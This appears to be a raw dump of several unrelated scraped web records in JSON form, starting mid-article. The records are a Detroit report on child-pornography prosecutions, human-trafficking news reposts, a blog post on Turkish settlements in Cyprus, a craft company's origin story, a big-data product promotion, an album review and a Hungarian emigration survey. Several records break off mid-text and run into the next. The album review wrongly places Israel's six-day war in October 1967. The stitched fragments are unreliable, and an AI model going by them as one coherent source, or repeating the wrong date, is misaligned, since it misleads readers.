to perform some type of sexual act on an adult or child,\" said Assistant U.S. Attorney Kevin Mulcahy, chief of the general crimes unit in the U.S. Attorney's Office in Detroit.\nBestiality images also are surfacing.\n\"It's really horrific,\" he said.\nChild porn lovers live in your neighborhood\nThey aren't just creepy loners.\nCrouched on a bench in the federal courthouse in Detroit almost every week, seemingly normal people \u2014 doctors, coaches, authors, engineers, teens \u2014 are charged with possessing and making child porn, a $3-billion-a-year industry that the federal government has labeled the new silent child abuse.\nOuted by their Internet activities, the accused stand before a judge, heads usually hung low, while their families sit in the back of the courtroom aghast at the accusations. And there typically is no criminal history to point to.\n\"There's this notion that it's the creepy neighbor who lives in the basement of his parent's house and downloads this stuff,\" said Assistant U.S. Attorney Kevin Mulcahy, chief of the general crimes unit for the U.S. Attorney's Office in Detroit.\nFar from it, he said.\nThere's another misconception about child porn, he added.\n\"It's not an eastern European problem, or southeast Asian problem. Half of the child porn traded in this country is made in this country,\" he said.\n100,000 Web sites\nCurrently, there are an estimated 100,000 known child porn Web sites, according to Brigham Young University Women's Services, which also reports that child porn generates $3 billion annually, accounting for one-quarter of the $12-billion U.S. porn industry.\nFueled by the secret nature of the Internet, child porn has increased to the point where the federal government can't keep track of it all. The Justice Department conceded in a report issued in August that the growth of child porn is outpacing efforts to combat it.\n\"Tragically, the only place we've seen a decrease is in the age of victims,\" U.S. Attorney General Eric Holder said in August, following the release of the report, which promised to hire 38 prosecutors especially for child porn cases.\nThe Justice Department report says complaints of online enticement of children have more than tripled from 2004 to 2008, and complaints of child prostitution rose tenfold. Since 2006, more than 8,600 people have been prosecuted at the federal level on child porn charges.\nEqually troubling, authorities said, is that not only are the kids getting younger, but the images are getting more graphic and violent. Children can be heard crying in some videos, they said.\nWhat's driving this trend?\nSome legal and psychological experts think it's the addictive nature of porn and its explosion on the Internet. The more users see, they say, the more they want.\n\"Normal sex acts don't excite them anymore,\" said Patrick Trueman, a former chief of the Justice Department's Child Exploitation and Obscenity Section. \"Now you're seeing the really extreme stuff, because once you've been through the still shots, that's not good enough.\"\nUsing social networking\nIn Michigan, a cyber crimes unit with the U.S. Immigration and Customs Enforcement (ICE) of the Department of Homeland Security has spotted another disturbing trend in recent months: Some people are using social networking to meet other child molesters. They're using peer-to-peer networks to molest kids in unison, with a remote audience participating.\nFor example, ICE agents arrested a 52-year-old Pinckney father last month for allegedly posing his three minor children in a sexually explicit manner during video chat sessions with a man in Texas. The other man did the same with his children. Both men have been charged. The Free Press is not releasing the name of the Michigan father to protect the identity of his children, ages 9, 8 and 5, according to court records.\nFarkIt\nBy TRESA BALDAS\nDetroit Free Press Staff Writer\nSteven Demink of Redford is accused of manipulating mothers into molesting their children and letting him view the sex acts.\nJohn Belloli, 50, of Dearborn Heights pleaded guilty to drugging a 7-year-old before using her for sex and photographing the acts.\nDr. Craig Tubbs, 50, of St. Louis, Mich., a family physician, admitted to having 54 child porn images stored in his e-mail. / Justice Department photos\nA child porn collector asks judge for mercy\n<!\u2013individual: 13 numChar :2216\n\u2013><!\u2013individual: 22 numChar :2217\n(Page 2 of 3)\nThen there's the case of Steven Demink, a Redford man a federal magistrate referred to as \"a cyber predator of the worst kind.\"\nDemink, 41, is accused of manipulating women in three states into molesting their children and letting him view the sex acts via webcam or photographs, according to court records. He has until Feb. 18 to plea, or face trial Feb. 28.\n\"This is the dark side of the Internet,\" said Brian Moskowitz, special agent in charge of ICE investigations in Michigan and Ohio. \"There have always been people with a deviant sexual interest in children. It's now easier for them to do what they do.\"\nAnd they're getting better at covering their tracks, said Moskowitz, who pointed out that today's child pornographer is computer savvy, some changing URLs every few days to throw the feds off track.\nMeanwhile, the agents are bringing prosecutors the goods.\nIn the Eastern District of Michigan, federal prosecutors in 2010 prosecuted 43 child porn cases \u2014 almost one a week \u2014 including 35 guilty pleas. They did not have figures for past years, but said that there has been a significant increase.\n\"It's far more serious, and the abuse and the suffering that these kids go through is incredible,\" Mulcahy said.\nThe court docket, he noted, speaks for itself.\nTake for example, John Belloli, 50, of Dearborn Heights, who is facing up to 35 years in prison for drugging a 7-year-old before engaging in sexual acts with the child and taking pictures of the acts. Belloli pleaded guilty in November.\nIn central Michigan, Dr. Craig Tubbs, 50, is facing 46 to 57 months in prison for possessing child porn. He is to be sentenced Feb. 14.\nTough cases to defend\nDefense attorneys are bombarded with requests to take on these cases, which are considered taboo among lawyers.\nRaymond Cassar, a criminal defense lawyer from Farmington Hills, currently has five child pornography cases, compared to his usual one a year. No doubt, it's the Internet that's driving the child porn trend, he said.\n\"People are under the impression that because they're viewing it in their home, they're not committing a crime,\" Cassar said.\nAdmittedly, the cases can be tough for the defense, he said. Cassar represents Belloli, whose case has been dubbed among the worst by the government, he said, noting the victim and her whereabouts are known.\n\"There is a living and breathing human being behind the case,\" Cassar said. Often, he said, the evidence consists only of a photograph or a video.\n\"In this case, the government says, 'Wait a minute, we have a live victim, and this is something that may haunt her for the rest of her life.' \"\nAnd that kind of evidence can be hard for a defendant to overcome, and a jury to forget.\nContact TRESA BALDAS: 313-223-4296 or tbaldas@freepress.com\nHonolulu Prosecutor Says Hawaii Doesn't Need A Human Trafficking Law\nBy Robert Brown 01/31/2011\nKeith Kaneshiro\nHonolulu's new prosecutor, Keith Kaneshiro, will not push to create a human trafficking law in Hawaii. However, in an interview with Civil Beat he acknowledged it's a problem for the state.\nKaneshiro told Civil Beat that last year's attempt to create legislation was well intentioned, but misguided.\n\"I think the people in human trafficking are genuinely passionate about the problem and they thought this was a way to go and attack the problem,\" Kaneshiro said of a bill last year. \"When the governor vetoed the bill, she had specific reasons to veto the bill. A lot of it was with the definition and also that there were existing laws that can cover the same conduct. So instead of looking at making a new law to cover the same conduct that exists in law, we'll just go and work with the existing law.\"\nHuman trafficking is the illegal trade of human beings for forced labor or sexual exploitation. Hawaii is one of five states without a law banning the practice.\nSeven human trafficking bills have been introduced this session. Kaneshiro says many human trafficking cases are handled on the federal side of the law, but for the cases the feds can't cover, \"we can always pick (them) up.\"\nIn the 2010 legislative session, a human trafficking bill that would have recognized some prostitutes as human trafficking victims was introduced and passed both chambers of the Hawaii Legislature unanimously.\nHowever, on July 6, 2010, former Gov. Linda Lingle vetoed the bill, citing criticism it received from law enforcement, prosecutors and public defenders, who unanimously opposed it.\nKaneshiro believes current prostitution laws can handle the bulk of human trafficking cases on the sexual exploitation side. His plan is to strengthen the laws.\nAs part of his 2011 legislative package, the prosecutor is proposing tougher sentencing for prostitution offenders. He is also pushing to have the state recognize that when prostitutes are victims, government needs to give them adequate protection. Kaneshiro plans to include prostitutes in the witness protection program for the first time, \"so they can get witness protection if they come and testify for the state and say that they were victimized.\"\nHis package calls to increase the penalties for prostitution by upgrading each degree of crime to the next level. For example, solicitors of prostitutes, or \"johns,\" will no longer be tried under a misdemeanor offense if the ofender has two or more prior convictions. If Kaneshiro gets his way, \"habitual johns\" will face Class C felony charges, which can result in five years of jail time.\n\"There's two types of human trafficking. One is laborers and one is prostitutes,\" Kaneshiro told Civil Beat. \"We're looking at the prostitution angle. One of the concerns with human trafficking that we need to address is that sometimes, the prostitutes are not the criminals, they're victims\u2026 Because they've been trafficked across state lines and they work and people profit from that.\"\nSome critics say tougher prostitution laws aren't the answer to the exploitation of women. Instead, nonprofits like Harm Reduction Hawaii advocate for the decriminalization of prostitution. When Civil Beat asked Kaneshiro about this approach, he said it wouldn't solve the problem.\n\"There is some merit that you can regulate the health and the transmission of disease, make sure they get their health certificates and everything,\" Kaneshiro said. \"A good example is go to Nevada. Not in Las Vegas, but outside of Las Vegas, you have legalized prostitution. But human trafficking is biggest in Nevada. They bring in the prostitutes from outside for sex slaves.\"\nBut Harm Reduction Hawaii's Executive Director Tracy Ryan disagrees with Kaneshiro's analyses.\n\"The only people that are saying that the high rates of human trafficking is occurring in Las Vegas are anti-trafficking advocacy groups who, in my opinion, have zero credibility whatsoever,\" Ryan told Civil Beat. She said increasing penalties for solicitors of prostitution would be counter productive.\n\"It makes things much worse than they are,\" Ryan said. \"It's because the people who are selling sex are selling sex for a reason. And the reason is money. And they still need the money even if all of the sudden, there is no more business selling sex. So what do they do? What's the alternative? Generally, the alternative is to turn to other crime when most of those others crimes, such as theft and drug dealing, have worse effects on the community than prostitution does.\"\nRyan said an alternative she has offered in the past was legislation that would have set up areas for prostitution. But, she said, \"the problem with setting up zoning is if you're going to have a tolerated zone, where's it going to be? You get into a NIMBY (not in my backyard) thing.\"\nShe says that there is no reason why Kaneshiro couldn't decriminalize off-street prostitution tomorrow. \"Ninety percent of people who sell sex do not do it on the street\u2026 So why not decriminalize activities which are between adults and consensual and not complained about?\"\nRyan does agree with Kaneshiro's take on adding a human trafficking law, however.\n\"We have a law for that already,\" Ryan said. \"Promoting prostitution in the first degree is a perfectly adequate law. It doesn't need to increase penalties. It would be nice if there were more prosecutions, which is the problem.\"\nBefore Kaneshiro's special election victory, Civil Beat asked then-candidate Kaneshiro if he thought current law was enough to address human trafficking. He replied:\n\"No. Victims of human trafficking should be included in the statewide witness program that provides for services to these types of victims. In addition, the laws on prostitution need to be simplified to clearly establish the prohibited conduct of human trafficking. The penalties for those involved should also be increased.\"\nBased on his answer, he seems to be holding true to his campaign rhetoric, at least for the most part. He is trying to add victims of trafficking to the witness protection program and is also increasing penalties. As far as simplifying the laws, however, Kaneshiro doesn't seem keen on tightening definitions.\nIn discussing the 2010 bill vetoed by Lingle, Kaneshiro said: \"They were caught up terming the crime human trafficking. They were caught up on that. The problem you have with that is, once you use that term, you have to have a definition for that term and in defining that term, you're going to have all kind of problems. And it's going to be litigation in how you define, 'human trafficking'.\"\nHuman trafficking hard to prove, hard to stop\nCORPUS CHRISTI, Texas \u2014 Authorities know that thousands of men, women and children are trafficked into Texas. Proving it in a court of law is another matter.\nCases involving human trafficking are hard to tease from prostitution and illegal immigration cases and are harder to prosecute unless a victim informs on the case. Investigators say victims are compelled into involuntary servitude, captivity or prostitution, according to an article in the Sunday edition of the Corpus Christi Caller-Times.\n\"They may be victims of trafficking that do not even know it,\" Sean McElroy of Homeland Security Investigations told the newspaper.\nMcElroy handles trafficking and smuggling investigations for U.S. Immigration and Customs Enforcement's Houston office. He said many victims initially appear to be illegal immigration cases until weeks of interviews show that they entered the United States against their will.\nA study by Texas Attorney General Greg Abbott found that human trafficking is far more common than the cases authorities have been able to prosecute. But Abbott spokesman Jerry Strickland said quantifying the problem with any degree of precision is nearly impossible \"by nature of the fact that it's been in the shadows for so long. Police and other law enforcement agencies are trying to bring it out from the shadows.\"\nFederal court records show no cases of human trafficking in 10 South Texas counties since 2000. Corpus Christi police said they cannot recall any cases where they were able to charge a suspect with trafficking, despite suspicions.\n\"The unfortunate part is that we don't have the statistics compiled for this area that maybe Houston or San Antonio have,\" said Amy Storbeck, a nurse who heads a Corpus Christi anti-trafficking nonprofit called Blue Nation.\nBeginning this year, state law requires newly sworn law enforcement officers to take a basic course in human trafficking. Legislation has been proposed with the aim of equipping local law enforcement to crack down on human trafficking rings that lead to or pass through Texas.\nA measure proposed by state Rep. Todd Hunter would create a shared statewide database. The Corpus Christi Republican reports that the database would store information relating to human trafficking arrests and convictions and provide demographic data to allow local law enforcement to detect patterns.\nThe attorney general's study said the state's busiest trafficking artery was the 900 miles of Interstate 10 that runs from El Paso to Houston, making both cities the state's busiest trafficking centers.\nTraffickers also enter the U.S. from Mexico near Laredo and drive toward Houston, passing through Corpus Christi, McElroy said.\nCorpus Christi police recall a local massage parlor staffed by a group of Asian women that some officers suspected was clearly a case of human trafficking. However, none of the women cried out to police, leaving little evidence on which to build a trafficking case. Officers ended up shutting down the business and hoping that resolved the issue.\n\"You don't always get them on the real crime,\" said Capt. John Houston of the Corpus Christi police vice and narcotics division. \"We hear the tips. Someone is forced to work at a very low wage, working off a debt that never goes down. We know that exists here. It's just hard to find,\" he told the newspaper.\nSaid Hunter, \"We still depend largely on kidnapping and prostitution laws to address human trafficking cases. A missing or kidnapped child whose face appears on a milk carton could actually be the victim of human trafficking.\"\nHuman Traffickers Indicted\nMassive Case Involves 600 Thai Victims\nIt seemed pretty straightforward: labor recruiters in Thailand approached impoverished rural farm workers\u2014who made around $1,000 (U.S.) annually\u2014and offered jobs on American farms for higher pay.\nMany, hoping to provide a better life for their families, accepted the offer, which was made through an American company called Global Horizons, in the business of recruiting foreign workers to work in the U.S. agricultural industry. But once in the U.S., the Thai workers soon discovered a harsh reality: they worked for little or no pay, and they were held in place with threats and intimidation.\nEventually, their plight became known to law enforcement, and earlier this month, after a multiagency investigation, two additional defendants\u2014accused of being part of the scheme to hold 600 Thai nationals in forced agricultural labor\u2014were indicted in federal court in Honolulu. They joined six individuals who had been indicted last fall.\nAmong those indicted? The CEO of Global Horizons, several Global employees, and two Thai labor recruiters.\nThe latest indictment alleges a conspiracy among those indicted that began in 2001 and ran until 2007.\nHow the scheme worked.\nThai recruiters allegedly met with rural farm workers, promising them good salaries, lots of hours, decent housing, and an employment contract that guaranteed work for up to three years. All the workers had to do was sign the contract\u2026and pay a \"recruitment fee.\"\nThe recruitment fees were substantial\u2026anywhere between $9,500 and $21,000. And even though they were given the option of paying a portion of the fee upfront and the rest while working in the U.S., the workers still had to borrow money to pay the smaller amount and up their family's land as collateral.\nMeanwhile, back in the U.S., Global Horizons was soliciting client growers\u2014at various agricultural conferences and through mailings\u2014with offers to supply foreign agricultural workers.\nConditions were tough.\nAccording to the indictment, once in the U.S., workers found that the work was not as plentiful as they had been led to believe, the hours not as long, and the pay not as good (that is, when they were paid at all).\nWhile working on farms in places like Hawaii and in several other parts of the country, they sometimes lived under brutal circumstances: at one place, workers were crammed into a large shipping container, with no indoor plumbing or air conditioning. Guards were sometimes hired to make sure no one escaped the living quarters. And workers sometimes witnessed threats of violence or experienced it first-hand.\nThey were made to feel as though they had no way out: workers' passports had been confiscated upon their arrival and they were told if they escaped, they would be arrested and sent back to Thailand, with no way to repay their debts and possibly leaving their families destitute.\nHuman trafficking investigations like these are\u2014and will continue to be\u2014a priority under the FBI's Civil Rights Program. During fiscal year 2010 alone, we opened 126 human trafficking investigations and made 115 arrests, with the assistance of our law enforcement partners often working together on task forces and working groups.\nBut perhaps more gratifying, we were able to completely dismantle 12 human trafficking organizations. And resulting prosecutions led to $2.7 million in fines and restitution for the victims of human trafficking.\n\u2013 More on FBI human trafficking efforts\nPosted on January 31, 2011 by Florida Coalition Against Human Trafficking\tin Labor Trafficking\t\u2022 Leave a comment\nFCAHT EVENT\n\"The Underside of Valentine's Day\"\nTies between Child Trafficking/Slavery and the Cocoa Industry\nMore than one hundred thousand children toil under extreme labor conditions on cocoa farms through western Africa, and at least 10,000 are victims of human trafficking and enslavement.\nAs Valentine's Day approaches, Americans will spend $345 million eating 58 million pounds of chocolate.\nMost chocolate purchases finance modern day slavery and human trafficking.\nGet Informed!!\nScreening of the film, \"The Dark Side of Chocolate\" will be followed by a panel of speakers.\nWhere: Mann Lounge at Stetson University College of Law\nWhen: Noon to 2pm, February 8, 2011\nLunch provided\nPlease R.S.V.P. by Feb. 3rd at arknight@law.stetson.edu\nImmigration Law Student Association (ILSA)\nAsian American Law Society (AALS)\nInternational Law Programs Office\nFlorida Coalition Against Human Trafficking\nPosted on January 31, 2011 by Florida Coalition Against Human Trafficking\tin FCAHT Events, Human Trafficking 101\t\u2022 Leave a comment\nNebraska Man Arrested, Accused of Human Trafficking\nThis story has an interesting twist. An 18 year old woman posted an ad on Craigslist looking for a female encounter. This goes to show that not all \"johns\" are males.

He has since been released from jail.\nAn 18-year-old woman, the accuser, told Bellevue Police she posted an ad on Craigslist looking for a female encounter. She says who she thought was a 22-year-old woman contacted her through text messages, but that person turned out to be Rosenow.\nThe accuser says she was also texted by who appeared to be an 18-year-old man and step-brother of the supposed 22-year-old woman. This \"man\" claimed the 22-year-old woman was actually a 14-year-old boy.

The only information gathered on the issue of child sex trafficking is based on girls who are victimized, yet no one has taken the time to research boys who are also forced and or coerced into the sex industry as a child. We need to stop ignoring the boys who are often victimized as well. remember human trafficking is not a women's issue, this is a HUMAN RIGHTS ISSUE. We at FCAHT believe that more research needs to be conducted on this issue and more services should be made available to boys who have been victimized and forced to work in the sex industry.\nJim Burress\nATLANTA, GA (WABE) \u2013 No one knows how many juvenile boys are sexually exploited. Research, while often comprehensive and specific to the conditions girls face, gives only a cursory mention of boys.\nThe latest fact sheet' published by the Governor's Office for Children and Families is titled, \"Georgia's sex trade problem.\" It talks about children. Victims. But the statistics are based entirely on girls.\n\"It's really an issue that's yet to be addressed as it should be, in my opinion,\" says Ray Newman. He focuses on ethics and public affairs for the Georgia Baptist Convention. Churches often lead the fight against underage trafficking, and reach out to its victims. Mention exploited boys, and even advocates don't know how to respond, if they acknowledge the problem.\n\" that's something that would open up an entirely area in this, and it certainly does need to be dealt with.\"\nA recent article in the journal Social Work concludes underage sex trafficking exists, in part, because of a culture of tolerance on the issue.\nBut for boys, it's often intolerance that leads to victimization, says Tana Hall, a Licensed Professional Counselor with Atlanta's YouthPride.\n\"The number one thing we get on our helpline is I've been kicked out and I don't know what to do and I don't know where to go.'\"\nYouthPride provides a safe space for lesbian, gay, bisexual, transgender and questioning youth. Hall says teenage boys who she councils often find themselves kicked out of their own homes. Others run away because their families are hostile towards them and their sexual identity.\nShe says that creates a situation ripe for exploitation.\n\"If you're vulnerable, and you need to some place to be, then that's when predators are gonna say, Oh, well how about this? I'll trade you this experience for you to stay here,' whether it be having sex or being prostituted out or dealing in drugs. There's a tit for a tat.\"\nSo-called \"couch surfing.\" Trading shelter, clothing, food, for sex. For survival. It still falls into the legal definition of sexual exploitation.\nThere's no one reason boys \u2013 or girls, for that matter \u2014 fall victim to such abuse. But when society looks for solutions, it can't avoid answers that are most obvious, says Hall.\n\"If we had a society that was more accepting of sexual orientation difference then our young people wouldn't find themselves in situations in harm's way, and there would be less sexual exploitation of young men.\"\nSexual exploitation of girls is no more or less egregious than abuse of boys.\nIt is better understood.\nJim Burress, WABE News.\nPosted on January 25, 2011 by Florida Coalition Against Human Trafficking\tin Human Trafficking 101, Sex Trafficking\t\u2022 3 Comments", "meta": {"redpajama_set_name": "RedPajamaCommonCrawl"}, "__index_level_0__": 15190}

{"text": "Turkey's Settlements, the ICC, and European Vacation-makers\nBy Eugene Kontorovich on January 6, 2013 12:07 pm in International Law, Israel, Uncategorized\nIn a press conference recently, Mahmoud Abbas threatened to use Palestine's G.A.-recognized \"state\" status to challenge Israel's settlements in the International Criminal Court. He picked a most unlikely venue for the presser \u2013 Ankara, in a joint conference with the the Turkish president. The absurdity of this is that Turkey continues to occupy northern Cyprus, and is responsible for a massive settlement program there.\nI've written before about \"other countries' settlements,\" but one might think that an increasing discussion of Israel's civilian communities in prosecutorial terms would increase the discusion of other (often more blatant) violations of the same international norm. Not quite.\nCyprus was a state with clear borders when Turkey invaded in 1974, and is a charter member of the ICC. If anyone should be loosing sleep over settlements suits in the ICC, it would be Turkey. Interestingly, no one has suggested in the past decade that Cyprus's ICC membership would scare the Turks out of N. Cyprus, or get the Turks to agree to a peace deal). But a referral by Cyprus would not face the various thorny temporality and territoriality issues of a Palestinian complaint. Moreover, Cyprus is a particularly gross case of changing the demographics of occupied territory through settlement, with settlers now outnumbering protected persons n the territory.\nApart from the manifest hypocrisy, what should be disappointing for believers in international humanitarian law is the failure of anyone to call Abbas (or Erdogan) on it. I am not aware of any news, NGO, or governmental response pointing out the unseemliness of Abbas invoking the ICC from Ankara.\nBut it turns out that Europeans have for the past decade taken a different kind of interest in the Turkish occupation, as Dore Gold reports. Priced out of the French Riviera and Amalfi coast, Europeans wanting to buy a Mediterranean vacation property increasingly flock to Turkish-occupied Cyprus.\nGold observes:\nEuropean governments have warned their citizens that former Greek residents of Northern Cyprus may initiate legal proceedings in European courts against those who take over their properties. But there is no objection being stated in principle against European citizens moving into these territories in order to build vacation homes.\nBut the European foreign ministries cannot have it both ways: they cannot condemn Israelis who build homes in the West Bank for violating international law, while they approve, in principle, or are at least silent about Turkish settlers and their European business partners who benefit from the lands Turkish Cypriots have taken over, as they develop what has been one of the hottest Mediterranean real estate markets for Europeans seeking a place in the sun.\nDiscussions of a potential ICC referral often focus on potential liability by Palestinians as a factor that would dissuade them (or the Court) from proceeding. But Israel's best bet for heading off such a suit would be to advertise the implications for other non-member states that would clearly be on the settlement hook: Turkey and Russia.\nFor the record, I think it quite unlikely that the ICC will indict Israeli leaders over settlements, but I'd bet the farm it wouldn't indict Israel and Turkish leaders in this decade. Indeed, if I were the Israeli government, I'd spend less time preparing an ICC defense that working up a Cypriot case against Turkey, as a favor to its new bestie.\nBy the way, the Europeans who are \"settling\" N. Cyprus do not themselves violate the Geneva Conventions, because i) only the \"occupying power\" can violate it, and ii) it only prohibits \"transfer\" of \"nationals of the occupying power.\" Assuming the Europeans are not Turkish citizens, they can't be settlers. Similarly, American Jews who move to, say East Jerusalem as American citizens cannot be said to be \"settlers,\" though popular usage may vary.\nADDENDUM: Because Cyprus is an ICC member, ANY member state can refer the situation of Turkish settlements to the ICC (or the prosecutor could begin an investigation on his own motion, which would be more exceptional). It does not have to be Cyprus \u2013 they've already consented to jurisdiction by signing the treaty. Given the great odium the international community attaches to settlement, it is interesting that there has not even by serious discussion of a such a referral.\nCyprus, ICC, Israel, Palestine, settlements, Turkey\nWhy Louis Michael Seidman should not ignore the Constitution\nWhose Alleged Settlement is Bigger?", "meta": {"redpajama_set_name": "RedPajamaCommonCrawl"}, "__index_level_0__": 24213}
{"text": "Origin Story \u2013 Fontenelle Supply Co.\nFontenelle Supply Co. is an idea originally born out of necessity.\nIts foundation was built on tradition.\nIt started in a basement in Omaha, Nebraska. Adam, Asher, and I would spend every Tuesday night drinking cheap beer and playing pool. We would sit around and discuss the hobbies that we had been tinkering around with. Every week, someone would have a new idea or project. We would plan our entire week around what would come to be known as \"Bro Night\".\nIt was our sabbath day. It was sacred.\nOne such project was axe restoration.\nEarlier in the week, Asher was attempting to chop wood in the backyard for the fire place. He found that modern-day axes and hatchets were simply not going to cut it. It came down to the fact that the steel is not manufactured the way that it used to be decades ago and would lose its edge very quickly. After a bit of research we found that, with a little bit of effort and time, we could bring an axe back to its former glory.\nThe next Bro Night, we turned the basement of Asher's house into a workshop, purchased a dozen rusty axe heads on Ebay, watched as many videos on the topic as possible, and instantly became obsessed. The idea that we could take an item, long forgotten, and not only make it usable again but better than anything you could go out and buy. That idea resonated with the three of us. It was a lost art form.\nWe only used time-honored, traditional techniques to restore our axes: rasping and reshaping the hickory handles by hand, using files and sharpening stones for the blades to ensure that no temper was lost, and eventually making hand-stitched leather sheaths.\nOver the next year and a half, we created a line of leather goods including wallets, belts, key fobs, and notebook covers. As with everything else we have done, the leather work is done by hand with the finest tools and materials to ensure durability.

{"text": "New Collaboration Aims to Set Big Data Standards\nBig data is difficult to manage. It is difficult to store, it is difficult to sort, it is difficult to interpret, and it is difficult to make work for you. But big data is also tremendously valuable, offering fantastic opportunities for developers to create useful apps and to improve their own products and processes. If only there were more consistent and useful standards to help developers manage the flow of data, the rewards of fully investing in big data would be more obtainable.\nIn response to this need comes the Open Data Initiative. Announced at Microsoft Ignite, the Open Data Initiative is a collaboration between Microsoft, Adobe, and SAP intended to allow big data sets to be transferred across systems, each of which can easily work with the data without compromising its ability to be moved. If it proves successful, this initiative will make it easier than ever for developers to make meaningful use of big data, as it means that the strengths of different solutions can be brought to bear to make the most of any data set. Even if it proves an insufficient solution to the problem, it's clear that the challenge of shared standards is being treated seriously by major companies in the industry.\nThe power of three major developers is behind the Open Data Initiative.\nSyncfusion has long tried to make big data an accessible tool for developers. Our Big Data Platform was the first and is still the only complete Hadoop distribution designed for Windows, Azure, and Linux. We know that developers work across a wide variety of platforms, and we know that it's simply irresponsible to not strive to make the data you need available across the platforms you use. Similarly, our Data Integration Platform makes it easy to take big data sets\u2014whether from one of our platforms or another\u2014and begin working with them immediately, and compatibility with other tools like our Dashboard Platform bring the power of other Syncfusion solutions to your big data projects. Regardless of what the future holds for projects like the Open Data Initiative, Syncfusion is already on the front lines of making big data easy to work with, regardless of how a developer uses big data.\nAre your big data needs being met?

{"text": "It took Israel six days to defeat a coalition of Egypt, Jordan and Syria in October of 1967 and guarantee its survival; it took Abraham Lincoln four years to defeat the Confederacy and end slavery once and for all; it took FDR and Truman four years to defeat Adolph Hitler and Nazism, the greatest evil the world has ever known.\nAfter more than ten years and counting, America under Bush and Obama are still bogged down in the graveyard of empires, the quagmire of Afghanistan, with another two years to go, and no one is asking why.\nWell, almost no one; David Rovics, a one-man musical occupation, places that question front and center in his new album, Meanwhile In Afghanistan\u2014which speaks truth to power, both here and abroad.\nIf you are on the left then you already know and admire Rovics' work, the \"musical version of Democracy Now,\" according to Amy Goodman; if you are in the mainstream then you probably have not, a problem Rovics himself addresses on the album's final song: Why Don't They Play You on the Radio? He is Fox News' worst nightmare\u2014an eloquent, articulate people's artist who has the facts on his side and takes a stand.\nSo let's not quibble: Rovics is the a folk singer for the converted; for disaffected Americans who haven't admired their president since perhaps Jimmy Carter; for disaffected Israelis who don't like Netanyahu and believe, like Jimmy Carter, that Israel is an Apartheid state only to be compared with South Africa during the imprisonment of Nelson Mandela. Rovics speaks for the 1%--but a different 1%--the one per cent who voted for Jill Stein of The Green Party for President. Like her, Rovics political philosophy may be summed up in the phrase, \"a plague on both their houses.\" \"Republicrats and Demoblicans,\" he calls them\u2014the two parties that control the political debate in this country, or as another author calls them\u2014the Plutocracy.\nActually, though, David Rovics has a larger audience than Jill Stein does; he has amassed over a million hits on his web site's various lyric pages. That puts him in Eugene Debs' territory: the man who ran for President from a prison cell, after coming out against American involvement in World War I, and got over a million votes.\nIf you substitute hits for votes, Rovics is a third party unto himself\u2014he is against war; against Empire, against injustice; for the common man, for Occupy Wall Street, for the Universal Soldier who he regards as another victim of America's constant war economy; for a thousand small activist groups on four continents who keep him touring under the radar screen of big media and big festivals. He performs for fewer folk audiences than for political audiences. Like Mencken, he comforts the afflicted, and afflicts the comfortable.\nDavid Rovics is the grassiest of grassroots performers\u2014a voice for the oppressed working class\u2014who for the most part don't even realize they are oppressed\u2014which is why they join the angry white male Tea Party and vote for a candidate and his running mate who have little more than contempt for them.\nDavid has been at it for twenty years now, since 1992, and shows no signs of slowing down. If you wonder what happened to the protest music of the 1960s, look no further; pick up his new album, to be released on December 1st, and breathe some fresh air.\nHe once signed a concert poster for me during his Halliburton Boardroom Massacre tour with his brief but trenchant personal motto, \"Aim high and throw hard.\" Keep throwing.", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 57568}

{"text": "Index.hu reports that around 1.2 million Hungarians plan to work abroad in the future. This rate is particularly high regarding the youth: nearly 40 per cent of them plan to seek work abroad. The report of index.hu is based on the representative survey of Publicus.\nGenerally, each respondent has around six family members or acquaintances who have left the country, and, in fact, this is the same number of the Hungarians working abroad permanently. 71 per cent of the respondents are involved in this topic: they are the ones whose family members and acquaintances work abroad permanently. It is generally believed that the increasing emigration is due to the low salaries, the Fidesz Government, and the bad economic situation. Six out of ten respondents experience a shortage of labour in their surroundings.\nRespondents have an average of 5.6 family members or acquaintances who work abroad permanently. This means a slight decrease compared to a survey of two years earlier. This means that some of the Hungarians working abroad either came home or emigrated for good. Fidesz supporters are less involved in this phenomenon than the average of 71 per cent: only 60 per cent of them have stated that they have family members or acquaintances living or working abroad. 83 per cent of the Jobbik supporters, 78 per cent of the MSZP supporters and 73 per cent of the indecisives have stated the same.\nAs we move from the youth towards the elderly, less and less people are involved. 85 per cent of the respondents under the age of 30 are involved, while this rate is only 56 per cent in the case of the respondents older than 60. Regarding learning, people graduated from primary school are the least involved (61%), while people having profession, matura or degree are far more involved (73%, 75% and 78%, respectively).\n15 per cent of the respondents plan to work abroad in the future \u2013 this means around 1.2 people. This rate is particularly high among youth \u2013 37 per cent of them plan to seek work abroad. This means an additional 530,000 potential emigrants younger than 30. Regarding middle-aged people, this rate is 13-15 per cent, while in the case of people older than 60 it is only 2 per cent.\nPeople planning to work abroad marked different reasons: low salary (55%), uncertain future (28%) and Hungarian politics and public life (27%) were the main reasons of leaving the country. Many also mentioned (6-13%) the unemployment rate, the uncertainty, and the hopelessness. However, professional challenge, gaining experience, exploring the world or learning languages are fundamental reasons for only a few people.\n43 per cent of the respondents think the low salaries are the main reason of the emigration, 26 per cent of them blame Fidesz Government and Viktor Orb\u00e1n, while 12 per cent believe it is due to the current economic situation. 7 per cent of them mention the previous governments, and another 7 per cent the lack of jobs. The latter was believed to be the reason in 23 per cent during the survey of two years earlier.\nThe order of the main reasons is quite similar regarding the supporters of every party. Mostly MSZP supporters (51%) think that it is impossible to get by with these salaries, but many Fidesz supporters (46%) mention it too. In sum, six out of ten respondents mention some economic or subsistence problems, while one third of them give political reasons.\n58 per cent of the respondents experience a shortage of labour. They think that its main consequence is that there are not enough doctors and nurses (46%), convenience stores close (38%) and catering establishments also close (22%). According to 62 per cent of the respondents, the main reason of the shortage of labour is low salary, while 55 per cent think that qualified people are already working abroad.\nThe order and rate of these reasons is similar among the supporters of Fidesz, MSZP and Jobbik. However, the indecisives have a very different opinion: they think the main reason is that there are lazy people who do not want to work. Their second reason in line is that less and less people are qualified for certain professions, while their third one is that many people choose communal work as it is more sure and/or it is worth it more.\nPreviousCurrency exchange \u2013 Hungarian Forint \u2013 20.06.2017.\nRecent statistics show that there are about 29,000 more deaths than births in Hungary each year. In addition, about 31,000 Hungarians (mostly young) move abroad every year for better economic opportunities. Hungary currently has a population of about 9.9 million. At this rate, the population of Hungary will decline by about 6 million people in the next 100 years and there will be no Hungary left at all in less than 200 years.\nThose are sad numbers. I don't understand why so many are leaving, especially when there are employment opportunities at home. Moving to another country and working there is great too, but wouldn't one want to be close to family and friends? I've met a few who have moved back home after seeing how difficult it is adjusting to a foreign life, language and country. Stay home, you have a beautiful country with less issues, believe it or 